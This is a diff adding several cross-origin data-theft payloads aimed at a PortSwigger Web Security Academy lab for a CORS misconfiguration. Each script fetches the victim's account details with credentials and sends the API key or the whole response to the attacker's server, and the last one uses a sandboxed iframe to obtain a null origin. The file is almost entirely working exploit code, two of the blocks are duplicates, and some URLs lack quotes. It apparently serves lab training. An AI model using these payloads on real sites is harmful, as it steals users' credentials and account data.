@@ -1,0 +1,49 @@
+<script>
+const exploit = async () => {
+    const labBaseUrl = https://0a7b00c804c76b6483c3600200d100cb.web-security-academy.net;
+    const details = '/accountDetails';
+    const response = await fetch(`${labBaseUrl}${details}`, {credentials: 'include'});
+    const data = await response.json();
+    fetch(`/hacked?apikey=${data.apikey}`)
+}
+
+exploit()
+</script>
+
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://0a7b00c804c76b6483c3600200d100cb.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script>
+
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://0a7b00c804c76b6483c3600200d100cb.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script>
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+<script>
+        const exploit = async () => {
+            const labBaseUrl = https://0a7b00c804c76b6483c3600200d100cb.web-security-academy.net;
+            const details = '/accountDetails';
+            const response = await fetch(`${labBaseUrl}${details}`, {credentials: 'include'});
+            const data = await response.json();
+            fetch(`/hacked?apikey=${data.apikey}`)
+        }
+
+        exploit()
+    </script>
+"></iframe>
